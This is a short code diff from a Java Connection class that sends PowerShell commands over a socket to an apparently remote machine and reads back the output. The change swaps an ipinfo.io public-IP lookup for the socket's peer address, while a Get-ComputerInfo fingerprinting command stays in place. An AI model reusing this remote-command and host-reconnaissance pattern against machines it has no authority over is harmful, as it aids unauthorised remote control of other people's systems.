@@ -91,10 +91,8 @@ public class Connection {
 	public String getSysInfo() throws IOException {
 		String sysInfo = "[not found]";
 		
-		dout.writeUTF(" Invoke-RestMethod http://ipinfo.io/json | Select -exp ip");
-		dout.flush();
-		ip = din.readUTF();
-		sysInfo = "\n" + "Public ip: " + ip;
+		ip = s.getInetAddress().toString().replace("/", "");
+		sysInfo = "\n" + "Ip: " + ip;
 			
 		dout.writeUTF(" Get-ComputerInfo | Select-Object WindowsRegisteredOwner, CsManufacturer, WindowsProductName, WindowsCurrentVersion | Format-List");
 		dout.flush();
